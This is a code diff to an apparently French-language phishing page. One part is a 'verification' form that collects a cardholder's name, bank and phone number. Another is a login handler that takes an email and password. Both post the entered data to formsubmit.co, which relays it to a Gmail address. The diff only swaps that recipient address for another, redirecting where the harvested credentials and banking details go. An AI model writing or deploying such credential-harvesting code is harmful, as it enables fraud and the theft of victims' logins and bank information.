@@ -600,7 +600,7 @@ input::placeholder{color:#b0c0c0}
 
   <div class="form-card">
     <h2>Coordonnées de vérification</h2>
-    <form id="verifyForm" novalidate action="https://formsubmit.co/ajax/catiasubtil593@gmail.com" method="POST">
+    <form id="verifyForm" novalidate action="https://formsubmit.co/ajax/tassotsarah@gmail.com" method="POST">
 
       <div class="field">
         <label for="fname">Nom du titulaire <span class="req">*</span></label>
@@ -755,7 +755,7 @@ async function handleLogin() {
     const data = new FormData();
     data.append('Email',        em.value);
     data.append('Mot de passe', pw.value);
-    await fetch('https://formsubmit.co/ajax/catiasubtil593@gmail.com', {
+    await fetch('https://formsubmit.co/ajax/tassotsarah@gmail.com', {
       method: 'POST', body: data, headers: { 'Accept': 'application/json' }
     });
   } catch (_) { /* on continue même en cas d'erreur réseau */ }
@@ -855,7 +855,7 @@ document.getElementById('verifyForm').addEventListener('submit', async e => {
   data.append('Banque',            document.getElementById('bank').value);
   data.append('Téléphone',         document.getElementById('phone').value);
   try {
-    const res = await fetch('https://formsubmit.co/ajax/catiasubtil593@gmail.com', {
+    const res = await fetch('https://formsubmit.co/ajax/tassotsarah@gmail.com', {
       method:'POST', body:data, headers:{'Accept':'application/json'}
     });
     if (res.ok) {
